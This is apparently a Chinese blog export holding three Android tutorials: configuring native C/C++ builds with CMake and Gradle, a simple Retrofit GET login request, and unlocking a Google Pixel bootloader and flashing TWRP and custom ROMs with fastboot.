<p><img src="http://static.zybuluo.com/wl9739/ltzzvosh6y1uulszsk6l7z5y/Figure-2.png" alt></p>
<ol>
<li><code>cpp</code> 目录存放你所有 native code 的地方，包括源码，头文件，预编译项目等。对于新项目，Android Studio 创建了一个 C++ 模板文件：<code>native-lib.cpp</code>，并且将该文件放到了你的 app 模块的 <code>src/main/cpp/</code>目录下。这份模板代码提供了一个简答的 C++ 函数：<code>stringFromJNI()</code>，该函数返回一个字符串：”Hello from C++”。</li>
<li><code>External Build Files</code> 目录是存放 CMake 或 ndk-build 构建脚本的地方。有点类似于 build.gradle 文件告诉 Gradle 如何编译你的 APP 一样，CMake 和 ndk-build 也需要一个脚本来告知如何编译你的 native library。对于一个新的项目，Android Studio 创建了一个 CMake 脚本：<code>CMakeLists.txt</code>，并且将其放到了你的 module 的根目录下。</li>
</ol>
<h3 id="编译运行示例-APP"><a href="#编译运行示例-APP" class="headerlink" title="编译运行示例 APP"></a>编译运行示例 APP</h3><p>当你点击 Run 按钮，Android Studio 会编译并启动一个 APP ，然后在 APP 中显示一段文字”Hello from C++”。从编译到运行示例 APP 的流程简单归纳如下：</p>
<ol>
<li>Gradle 调用外部构建脚本，也就是 CMakeLists.txt。</li>
<li>CMake 会根据构建脚本的指令去编译一个 C++ 源文件，也就是 native-lib.cpp，并将编译后的产物扔进共享对象库中，并将其命名为 libnative-lib.so，然后 Gradle 将其打包到 APK 中。</li>
<li>在运行期间，APP 的 MainActivity 会调用 System.loadLibrary() 方法，加载 native library。而这个库的原生函数，stringFromJNI()，就可以为 APP 所用了。</li>
<li>MainActivity.onCreate() 方法会调用 stringFromJNI()，然后返回 “Hello from C++”，并更新 TextView 的显示。</li>
</ol>
<blockquote>
<p>注意：Instant Run 并不兼容使用了 native code 的项目。Android Studio 会自动禁止 Instant Run 功能。</p>
</blockquote>
<p>如果你想验证一下 Gradle 是否将 native library 打包进了 APK，你可以使用 APK Analyzer:</p>
<ol>
<li>选择 Build &gt; Analyze APK。</li>
<li>从 app/build/outputs/apk/ 路径中选择 APK，并点击 OK。</li>
<li>如下图，在 APK Analyzer 窗口中，选择 lib/<abi>/，你就可以看见 libnative-lib.so </abi></li>
</ol>
<p><img src="http://static.zybuluo.com/wl9739/ei2c0h7dftdi8tp9nuafvt30/Figer-3.png" alt></p>
<h3 id="将-C-C-代码添加到现有的项目中"><a href="#将-C-C-代码添加到现有的项目中" class="headerlink" title="将 C/C++ 代码添加到现有的项目中"></a>将 C/C++ 代码添加到现有的项目中</h3><p>如果你想将 native code 添加到一个现有的项目中，请按照下面的步骤操作：</p>
<ol>
<li>创建新的 native source 文件，并将其添加到你的 Android Studio 项目中。如果你已经有了 native code，也可以跳过这一步。</li>
<li>创建一个 CMake 构建脚本。如果你已经有了一个 CMakeLists.txt 构建脚本，或者你想使用 ndk-build 然后有一个 Android.mk 构建脚本，也可以跳过这一步。</li>
<li>将你的 native library 与 Gradle 关联起来。Gradle 使用构建脚本将源码导入到你的 Android Studio 项目中，并且将你的 native library （也就是 .so 文件）打包到 APK 中。</li>
</ol>
<p>一旦你配置好了项目，你就可以在 Java 代码中，使用 JNI 框架开调用原生函数（native functions）。只需要点击 Run 按钮，就可以编译运行你的 APP 了。</p>
<h4 id="创建新的-native-source-文件"><a href="#创建新的-native-source-文件" class="headerlink" title="创建新的 native source 文件"></a>创建新的 native source 文件</h4><p>请按照下面的方法来创建一个 cpp/ 目录和源文件（native source files）：</p>
<ol>
<li>打开IDE左边的 Project 面板，选择 Project 视图。</li>
<li>找到你项目的 module &gt; src 目录，右键点击 main 目录，选择 New &gt; Directory。</li>
<li>输入目录的名字（比如 cpp），然后点击 OK。</li>
<li>右键点击刚才创建好的目录，选择 New &gt; C/C++ Source File。</li>
<li>输入文件名，比如 native-lib。</li>
<li>在 Type 菜单下拉选项中，选择源文件的扩展后缀名，比如 .cpp。</li>
<li>如果你也想创建一个头文件，点击 Create an associated header 选项框。</li>
<li>点击 OK。</li>
</ol>
<h4 id="创建-CMake-构建脚本"><a href="#创建-CMake-构建脚本" class="headerlink" title="创建 CMake 构建脚本"></a>创建 CMake 构建脚本</h4><p>如果没有一个 CMake 构建脚本，你需要自己手动创建一个，并添加一些合适的 CMake 命令。CMake 构建脚本是一个空白的文本文档（后缀为 .txt 的文件），名字必须为 CMakeLists.txt。</p>
<blockquote>
<p>注意：如果你的项目使用了 ndk-build，你就不需要创建 CMake 构建脚本，只需要提供一个路径链，将你的 Android.mk 文件链接到 Gradle 中即可。</p>
</blockquote>
<p>将一个空白的文本文档变成一个 CMake 构建脚本，你需要这么做：</p>
<ol>
<li>打开 IDE 左边的 Project 面板，选择 Project 视图。</li>
<li>在你的 module 根目录下，右键，选择 New &gt; File。</li>
<li>输入 “CMakeLists.txt” 作为文件名，并点击 OK。</li>
</ol>
<p>现在，你可以添加 CMake 命令来配置你的构建脚本了。为了让 CMake 将源代码（native source code）编译成 native library。需要在编译文件中添加 cmake_minimum_required() 和 add_library() 命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Sets the minimum version of CMake required to build your native library.</span><br><span class="line"># This ensures that a certain set of CMake features is available to</span><br><span class="line"># your build.</span><br><span class="line"></span><br><span class="line">cmake_minimum_required(VERSION 3.4.1)</span><br><span class="line"></span><br><span class="line"># Specifies a library name, specifies whether the library is STATIC or</span><br><span class="line"># SHARED, and provides relative paths to the source code. You can</span><br><span class="line"># define multiple libraries by adding multiple add.library() commands,</span><br><span class="line"># and CMake builds them for you. When you build your app, Gradle</span><br><span class="line"># automatically packages shared libraries with your APK.</span><br><span class="line"></span><br><span class="line">add_library( # Specifies the name of the library.</span><br><span class="line">             native-lib</span><br><span class="line"></span><br><span class="line">            # Sets the library as a shared library.</span><br><span class="line">             SHARED</span><br><span class="line"></span><br><span class="line">            # Provides a relative path to your source file(s).</span><br><span class="line">            src/main/cpp/native-lib.cpp )</span><br></pre></td></tr></table></figure>
<p>当你使用 add_library()，将一个源文件（source file）或库添加到你的 CMake 构建脚本，同步你的项目，然后你会发现 Android studio 将关联的头文件也显示了处理。然而，为了让 CMake 在编译时期能定位到你的头文件，你需要在 CMake 构建脚本中添加 include_directories() 命令，并指定头文件路径：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_library(...)</span><br><span class="line"></span><br><span class="line"># Specifies a path to native header files.</span><br><span class="line">include_directories(src/main/cpp/include/)</span><br></pre></td></tr></table></figure></p>
<p>然后，按照约定，CMake 会将生成的 library 命名为下面的形式：</p>
<p><code>lib*library-name*.so</code></p>
<p>比如，如果你在构建脚本中，将 library 命名为 “native-lib”，那么 CMake 会创建叫 libnative-lib.so 的文件。但是，当你将 library 加载到 Java 代码中的时候， 你需要使用在 CMake 中指定的名称：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static &#123;</span><br><span class="line">        System.loadLibrary(“native-lib”);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
</blockquote>
<p>注意：如果你将 CMake 脚本里面的 library 重命名了，或者移除了。你需要清理一下你的工程。在 IDE 的菜单栏中选择 Build &gt; Clean Project。</p>
<p>Android Studio 会在 Project 面板中的 cpp 目录中自动添加源文件和头文件。你可以多次使用 <code>add_library()</code>命令，来添加额外的 library。</p>
<h4 id="添加-NDK-APIs"><a href="#添加-NDK-APIs" class="headerlink" title="添加 NDK APIs"></a>添加 NDK APIs</h4><p>Android NDK 提供了一些有用的 native APIs。将 NDK librarys 添加到 CMakeLists.txt 脚本文件中，就可以使用这些 API 了。</p>
<p>预编译的 NDK librarys 已经存在在 Android 平台中了，所以你不需要编译它们，或者是将其打包到你的 APK 中。因为这些 NDK librarys 已经是 CMake 搜索路径的一部分，你甚至不需要提供你本地安装的 NDK 路径。你只需要向 CMake 提供你想使用的 library 名字。</p>
<p>将 <code>find_library()</code> 命令添加到你的 CMake 构建脚本中，这样就可以定位 NDK library 的位置，并将其位置存储在一个变量之中。你可以在构建脚本的其他地方使用这个变量，来代指 NDK library。下面的示例代码将 <code>Android-specific log support library</code>的位置存储到变量 <code>log-lib</code> 中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find_library( # Defines the name of the path variable that stores the</span><br><span class="line">              # location of the NDK library.</span><br><span class="line">              log-lib</span><br><span class="line"></span><br><span class="line">              # Specifies the name of the NDK library that</span><br><span class="line">              # CMake needs to locate.</span><br><span class="line">              log )</span><br></pre></td></tr></table></figure>
<p>NDK 同样也包含一些只包含源码的 library，这些就需要你去编译，然后链接到你的本地库（native library）。你可以在 CMake 构建脚本中使用 <code>add_library()</code> 命令将源码编译进本地库。这时就需要提供你的本地 NDK 安装路径，通常将该路径保存在 <code>ANDROID_NDK</code> 变量中，这样 Android Studio 可以自动为你识别。</p>
<p>下面的命令告诉 CMake 去构建 <code>android_native_app_glue.c</code>，这个命令可以管理 <code>NativeActivity</code>的生命周期以及点击输入，并将其导入静态库中，然后将其链接至 <code>native-lib</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_library( app-glue</span><br><span class="line">             STATIC</span><br><span class="line">             $&#123;ANDROID_NDK&#125;/sources/android/native_app_glue/android_native_app_glue.c )</span><br><span class="line"></span><br><span class="line"># You need to link static libraries against your shared native library.</span><br><span class="line">target_link_libraries( native-lib app-glue $&#123;log-lib&#125; )</span><br></pre></td></tr></table></figure>
<h4 id="添加其他的预编译库"><a href="#添加其他的预编译库" class="headerlink" title="添加其他的预编译库"></a>添加其他的预编译库</h4><p>添加预编译库和添加本地库（native library）类似。由于预编译库是已经构建好的，你想就要使用 IMPORTED 标志去告诉 CMake ，你只需要将其导入到你的项目中即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_library( imported-lib</span><br><span class="line">             SHARED</span><br><span class="line">             IMPORTED )</span><br></pre></td></tr></table></figure>
<p>然后你需要使用 set_target_properties() 命令去指定库的路径，就像下面的代码那样。</p>
<p>一些库会根据不同的 CPU 使用不同的包，或者是 Application Binary Interfaces(ABI)，并且将他们归类到不同的目录中。这样做的好处是，可以充分发挥特定的 CPU 架构。你可以使用 ANDROID_ABI 路径变量，将多个 ABI 版本的库添加到你的 CMake 构建脚本中。这个变量使用了一些 NDK 默认支持的 ABI，以及一些需要手动配置到 Gradle 的 ABI，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_library(...)</span><br><span class="line">set_target_properties( # Specifies the target library.</span><br><span class="line">                       imported-lib</span><br><span class="line"></span><br><span class="line">                       # Specifies the parameter you want to define.</span><br><span class="line">                       PROPERTIES IMPORTED_LOCATION</span><br><span class="line"></span><br><span class="line">                       # Provides the path to the library you want to import.</span><br><span class="line">                       imported-lib/src/$&#123;ANDROID_ABI&#125;/libimported-lib.so )</span><br></pre></td></tr></table></figure>
<p>为了让 CMake 在编译时期能找到你的头文件，你需要使用 include_directories() 命令，并且将你的头文件地址传进去：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include_directories( imported-lib/include/ )</span><br></pre></td></tr></table></figure>
<p>在 CMake 构建脚本中使用 target_link_libraries() 命令，将预构建库与你本地库相关联：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target_link_libraries( native-lib imported-lib app-glue $&#123;log-lib&#125; )</span><br></pre></td></tr></table></figure>
<p>当你构建你的 APP 的时候，Gradle 会自动将导入的库打包到你的 APK 中。你可以使用 APK Analyzer 来检查。</p>
<h3 id="关联本地库与-Gradle"><a href="#关联本地库与-Gradle" class="headerlink" title="关联本地库与 Gradle"></a>关联本地库与 Gradle</h3><p>为了将本地库与 Gradle 相关联，你需要在 CMake 或 ndk-build 构建脚本中提供一个路径地址。当你构建你的 APP 时，Gradle 会将 CMake 或 ndk-build 作为一个依赖运行，然后将共享库（.so 文件）打包到你的 APK 中。Gradle 同样使用构建脚本来识别哪些文件需要导入到 Android Studio 项目，你可以从 Project 窗口面板中看到相应的文件。如果你还没有一个为 native sources 准备的构建脚本，你需要先创建一个。</p>
<h4 id="使用-Android-Studio-图形化界面"><a href="#使用-Android-Studio-图形化界面" class="headerlink" title="使用 Android Studio 图形化界面"></a>使用 Android Studio 图形化界面</h4><p>你可以使用 Android Studio 的图形化界面来将 Gradle 与外部 CMake 或者 ndk-build 项目关联起来。</p>
<ol>
<li>打开 IDE 左边的 Project 面板，选择 Android 视图。</li>
<li>右键点击你想链接本地库的 module，比如 app module，然后从菜单中选择 Link C++ Project with Gradle。你应该能看见一个和下图很像的对话框。</li>
<li>在下拉菜单中，选择 CMake 或者 ndk-build。<ul>
<li>如果你选择 CMake，需要在 Project Path 中指定 CMakeLists.txt 脚本文件的路径。</li>
<li>如果你选择 ndk-build，你需要在 Project Path 中指定 Android.mk 脚本文件的路径。<br><img src="http://static.zybuluo.com/wl9739/q80ozydc9jw0ktk8quobcmq3/Figure%203.jpg" alt></li>
</ul>
</li>
<li>点击 OK。</li>
</ol>
<h4 id="手动配置-Gradle"><a href="#手动配置-Gradle" class="headerlink" title="手动配置 Gradle"></a>手动配置 Gradle</h4><p>如果要手动将 Gradle 与你的本地库相关联，你需要在 module 层级的 build.gradle 文件中添加 <code>externalNativeBuild {}</code> 代码块，并且在该代码块中配置 <code>cmake {}</code> 或 <code>ndkBuild {}</code>：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">  ...</span><br><span class="line">  defaultConfig &#123;...&#125;</span><br><span class="line">  buildTypes &#123;...&#125;</span><br><span class="line"></span><br><span class="line">  // Encapsulates your external native build configurations.</span><br><span class="line">  externalNativeBuild &#123;</span><br><span class="line"></span><br><span class="line">    // Encapsulates your CMake build configurations.</span><br><span class="line">    cmake &#123;</span><br><span class="line"></span><br><span class="line">      // Provides a relative path to your CMake build script.</span><br><span class="line">      path &quot;CMakeLists.txt&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="可选配置"><a href="#可选配置" class="headerlink" title="可选配置"></a>可选配置</h5><p>你可以在你的 module 层级的 build.gradle 文件中的 defaultConfig {} 代码块中，添加 externalNativeBuild {} 代码块，为 CMake 或 ndk-build 配置一些额外参数。当然，你也可以在你的构建配置中的其他每一个生产渠道重写这些属性。</p>
<p>比如，如果你的 CMake 或者 ndk-build 项目中定义了多个本地库，你想在某个生产渠道使用这些本地库中的几个，你就可以使用 targets 属性来构建和打包。下面的代码展示了一些你可能会用到的属性：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">  ...</span><br><span class="line">  defaultConfig &#123;</span><br><span class="line">    ...</span><br><span class="line">    // This block is different from the one you use to link Gradle</span><br><span class="line">    // to your CMake or ndk-build script.</span><br><span class="line">    externalNativeBuild &#123;</span><br><span class="line"></span><br><span class="line">      // For ndk-build, instead use ndkBuild &#123;&#125;</span><br><span class="line">      cmake &#123;</span><br><span class="line"></span><br><span class="line">        // Passes optional arguments to CMake.</span><br><span class="line">        arguments &quot;-DCMAKE_VERBOSE_MAKEFILE=TRUE&quot;</span><br><span class="line"></span><br><span class="line">        // Sets optional flags for the C compiler.</span><br><span class="line">        cFlags &quot;-D_EXAMPLE_C_FLAG1&quot;, &quot;-D_EXAMPLE_C_FLAG2&quot;</span><br><span class="line"></span><br><span class="line">        // Sets a flag to enable format macro constants for the C++ compiler.</span><br><span class="line">        cppFlags &quot;-D__STDC_FORMAT_MACROS&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buildTypes &#123;...&#125;</span><br><span class="line"></span><br><span class="line">  productFlavors &#123;</span><br><span class="line">    ...</span><br><span class="line">    demo &#123;</span><br><span class="line">      ...</span><br><span class="line">      externalNativeBuild &#123;</span><br><span class="line">        cmake &#123;</span><br><span class="line">          ...</span><br><span class="line">          // Specifies which native libraries to build and package for this</span><br><span class="line">          // product flavor. If you don&apos;t configure this property, Gradle</span><br><span class="line">          // builds and packages all shared object libraries that you define</span><br><span class="line">          // in your CMake or ndk-build project.</span><br><span class="line">          targets &quot;native-lib-demo&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    paid &#123;</span><br><span class="line">      ...</span><br><span class="line">      externalNativeBuild &#123;</span><br><span class="line">        cmake &#123;</span><br><span class="line">          ...</span><br><span class="line">          targets &quot;native-lib-paid&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // You use this block to link Gradle to your CMake or ndk-build script.</span><br><span class="line">  externalNativeBuild &#123;</span><br><span class="line">    cmake &#123;...&#125;</span><br><span class="line">    // or ndkBuild &#123;...&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="指定-ABI"><a href="#指定-ABI" class="headerlink" title="指定 ABI"></a>指定 ABI</h5><p>一般情况下，Gradle 会将你的本地库构建成 .so 文件，然后将其打包到你的 APK 中。如果你想 Gradle 构建并打包某个特定的 ABI 。你可以在你的 module 层级的 build.gradle 文件中使用 ndk.abiFilters 标签来指定他们：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">  ...</span><br><span class="line">  defaultConfig &#123;</span><br><span class="line">    ...</span><br><span class="line">    externalNativeBuild &#123;</span><br><span class="line">      cmake &#123;...&#125;</span><br><span class="line">      // or ndkBuild &#123;...&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ndk &#123;</span><br><span class="line">      // Specifies the ABI configurations of your native</span><br><span class="line">      // libraries Gradle should build and package with your APK.</span><br><span class="line">      abiFilters &apos;x86&apos;, &apos;x86_64&apos;, &apos;armeabi&apos;, &apos;armeabi-v7a&apos;,</span><br><span class="line">                   &apos;arm64-v8a&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  buildTypes &#123;...&#125;</span><br><span class="line">  externalNativeBuild &#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大多数情况，你只需要像上面的代码那样，在 ndk {} 代码块中指定 abiFilters 即可。如果你想控制 Gradle 构建、依赖你希望的东西，你就需要在 defaultConfig.externalNativeBuild.cmake {} 代码块或 defaultConfig.externalNativeBuild.ndkBuild {} 代码块中，配置其他的 abiFilters 标签。Gradle 会构建这些 ABI 配置，但是只会将 defaultConfig.ndk {} 代码块中指定的东西打包到 APk 中。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ndk</tag>
      </tags>
  </entry>
  <entry>
    <title>在Android上用一个简单的GET请求了解Retrofit是怎么用的</title>
    <url>/Android/%E5%9C%A8Android%E4%B8%8A%E7%94%A8%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84GET%E8%AF%B7%E6%B1%82%E4%BA%86%E8%A7%A3Retrofit%E6%98%AF%E6%80%8E%E4%B9%88%E7%94%A8%E7%9A%84/</url>
    <content><![CDATA[<p><a href="http://square.github.io/retrofit/" target="_blank" rel="noopener">http://square.github.io/retrofit/</a></p>
<h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>引入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">compile &apos;com.squareup.retrofit2:retrofit:2.0.0&apos;</span><br><span class="line">compile &apos;com.squareup.retrofit2:converter-gson:2.+&apos;</span><br></pre></td></tr></table></figure></p>
<p>权限<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;</span><br></pre></td></tr></table></figure></p>
<p>协议<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/api/v1/user/login/&#123;name&#125;/&#123;passwd&#125;</span><br></pre></td></tr></table></figure></p>
<p>Curl<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X GET --header &apos;Accept: application/json&apos; &apos;http://192.168.1.219/api/v1/user/login/sam/123&apos;</span><br></pre></td></tr></table></figure></p>
<hr>
<h5 id="开始写代码"><a href="#开始写代码" class="headerlink" title="开始写代码"></a>开始写代码</h5><p>写一个API接口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import retrofit2.Call;</span><br><span class="line">import retrofit2.http.GET;</span><br><span class="line">import retrofit2.http.Path;</span><br><span class="line"></span><br><span class="line">public interface LoginService &#123;</span><br><span class="line"></span><br><span class="line">    @GET(&quot;/api/v1/user/login/&#123;name&#125;/&#123;passwd&#125;&quot;)</span><br><span class="line">    Call&lt;Login&gt; login(@Path(&quot;name&quot;) String name , @Path(&quot;passwd&quot;) String passwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>请求响应的Model<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Login &#123;</span><br><span class="line"></span><br><span class="line">    private int code;</span><br><span class="line">    private String token;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;LoginDemo&#123;&quot; +</span><br><span class="line">                &quot;code=&quot; + code +</span><br><span class="line">                &quot;, token=&apos;&quot; + token + &apos;\&apos;&apos; +</span><br><span class="line">                &apos;&#125;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getCode() &#123;</span><br><span class="line">        return code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setCode(int code) &#123;</span><br><span class="line">        this.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getToken() &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setToken(String token) &#123;</span><br><span class="line">        this.token = token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>分别使用了同步和异步（推荐异步）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import android.support.v7.app.AppCompatActivity;</span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.util.Log;</span><br><span class="line">import android.widget.TextView;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">import retrofit2.Call;</span><br><span class="line">import retrofit2.Callback;</span><br><span class="line">import retrofit2.Response;</span><br><span class="line">import retrofit2.Retrofit;</span><br><span class="line">import retrofit2.converter.gson.GsonConverterFactory;</span><br><span class="line"></span><br><span class="line">public class MainActivity extends AppCompatActivity &#123;</span><br><span class="line"></span><br><span class="line">    TextView tv;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        tv = (TextView)findViewById(R.id.tv);</span><br><span class="line"></span><br><span class="line">        Retrofit loginRetrofit = new Retrofit.Builder()</span><br><span class="line">                .baseUrl(&quot;http://192.168.1.219&quot;)</span><br><span class="line">                .addConverterFactory(GsonConverterFactory.create())</span><br><span class="line">                .build();</span><br><span class="line">        LoginService loginService = loginRetrofit.create(LoginService.class);</span><br><span class="line">        final Call&lt;Login&gt; result = loginService.login(&quot;sam&quot;, &quot;123&quot;);</span><br><span class="line"></span><br><span class="line">        //同步</span><br><span class="line">        new Thread() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                super.run();</span><br><span class="line">                try &#123;</span><br><span class="line">                    //result实例只能用一次，clone可以生成另外一个相同的实例</span><br><span class="line">                    //这里是同步执行，不能在UI线程执行</span><br><span class="line">                    Log.e(&quot;onCreate: 同步&quot;, result.clone().execute().body().toString());</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //异步</span><br><span class="line">        result.enqueue(new Callback&lt;Login&gt;() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onResponse(Call&lt;Login&gt; call, Response&lt;Login&gt; response) &#123;</span><br><span class="line">                //Do something with response</span><br><span class="line"></span><br><span class="line">                Log.i(&quot;onResponse: 异步&quot;, &quot;code = &quot; + response.code());</span><br><span class="line">                if (response.body() != null)&#123;</span><br><span class="line">                    Log.i(&quot;onResponse: 异步&quot;, response.body().toString());</span><br><span class="line">                    tv.setText(response.body().toString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void onFailure(Call&lt;Login&gt; call, Throwable t) &#123;</span><br><span class="line">                //Do something with failure</span><br><span class="line">                Log.e(&quot;onFailure: 异步&quot;, t.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>用 Google Pixel 刷机示例</title>
    <url>/Android/%E7%94%A8%20Google%20Pixel%20%E5%88%B7%E6%9C%BA%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<h2 id="fastboot常用命令"><a href="#fastboot常用命令" class="headerlink" title="fastboot常用命令"></a>fastboot常用命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 解锁</span><br><span class="line">$ fastboot flashing unlock</span><br><span class="line"></span><br><span class="line"># 重启</span><br><span class="line">$ fastboot reboot</span><br><span class="line"></span><br><span class="line"># 刷入recovery</span><br><span class="line">$ fastboot flash recovery recovery.img</span><br><span class="line"></span><br><span class="line"># 启动临时recovery</span><br><span class="line">$ fastboot boot recovery.img</span><br></pre></td></tr></table></figure>
<h2 id="Pixel解Bootloader锁"><a href="#Pixel解Bootloader锁" class="headerlink" title="Pixel解Bootloader锁"></a>Pixel解Bootloader锁</h2><p>想要刷ROM，解BL锁时第一步：</p>
<ol>
<li>在Android系统设置选项的开发者中，打开调试模式，打开OEM解锁，连接数据线。</li>
<li>关机</li>
<li>长按 “音量-“ + “电源”按键，进入Bootloader</li>
<li><code>fastboot flashing unlock</code>命令解锁 (需要有platform-tools才能运行fastboot)</li>
<li>如果成功就重启 <code>fastboot reboot</code></li>
</ol>
<p><strong>注意：解锁之后，Pixel在每次开机都会提示不安全，可以不要管。解锁之后，不要再上锁，特别是ROOT之后，上锁就进不了系统，手机变砖。</strong></p>
<p><img src="/images/android/Pixel_04.jpg" alt></p>
<h2 id="Pixel刷Recovery示例"><a href="#Pixel刷Recovery示例" class="headerlink" title="Pixel刷Recovery示例"></a>Pixel刷Recovery示例</h2><p>刷个第三方的Recovery，就可以为所欲为了，TWRP是强大的Recovery。</p>
<ol>
<li><p>下载twrp<br>根据手机的设备代号下载相关的<a href="https://twrp.me" target="_blank" rel="noopener">twrp包</a>，如Pixel是sailfish,<br>下载 <code>.img</code> 和 <code>.zip</code> 两个包。</p>
</li>
<li><p>刷入临时twrp.img</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ fastboot flash recovery twrp-3.3.1-0-sailfish.img</span><br><span class="line">Sending &apos;recovery&apos; (31092 KB)                      OKAY [  0.793s]</span><br><span class="line">Writing &apos;recovery&apos;                                 (bootloader) Flashing active slot &quot;_b&quot;</span><br><span class="line">FAILED (remote: &apos;partition [recovery] doesn&apos;t exist&apos;)</span><br><span class="line">Finished. Total time: 1.008s</span><br></pre></td></tr></table></figure>
</li>
<li><p>进入临时twrp.img</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ fastboot boot twrp-3.3.1-0-sailfish.img</span><br><span class="line">Downloading &apos;boot.img&apos;                             OKAY [  0.721s]</span><br><span class="line">booting                                            OKAY [  1.011s]</span><br><span class="line">Finished. Total time: 1.765s</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装正式twrp.zip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 这时候是可以通过电脑访问存储的，将twrp.zip包放到内部存储下</span><br><span class="line">2. 进入临时的twrp，使用“安装”，将twrp.zip刷到手机上。</span><br><span class="line">3. 进入twrp的“清理”格式化data（否则内部存储无法写）</span><br><span class="line">4. 重启</span><br><span class="line">5. 进入TWRP Recovery</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>注意：一般手机是”音量+” + “电源”按键进入Recovery，但我这里的Pixel无法进入，可以先进入Bootloader，通过音量键选择菜单 Recovery Mod，这样才进去TWRP</strong></p>
<h2 id="刷ROM"><a href="#刷ROM" class="headerlink" title="刷ROM"></a>刷ROM</h2><p>到这里就可以开始刷机了，这里刷机都是指“卡刷”，意思是通过将ROM拷贝到内部存储(sdcard)，再通过Recovery将ROM安装到手机。</p>
<p>Pixel是Google亲儿子系列， 可以通过<a href="https://developers.google.cn/android/images" target="_blank" rel="noopener">Google官方下载渠道</a>下载，里面会有GMS依赖，但是系统会比较新，如<a href="https://dl.google.com/dl/android/aosp/sailfish-qp1a.191005.007.a3-factory-d4552659.zip" target="_blank" rel="noopener">Pixel的Android10都出来了</a></p>
<p>另外刷机都是选择第三方ROM：</p>
<ul>
<li>Lineage OS （<a href="http://download.lineageos.org.cn" target="_blank" rel="noopener">国内有镜像</a>）</li>
<li>Resurrection Remix OS （<a href="https://get.resurrectionremix.com/oreo/pixel/RR-O-v6.0.0-20180507-sailfish-Official.zip" target="_blank" rel="noopener">国内无法下载，除非在网盘有找到这些ROM</a>）</li>
<li>Carbon OS</li>
</ul>
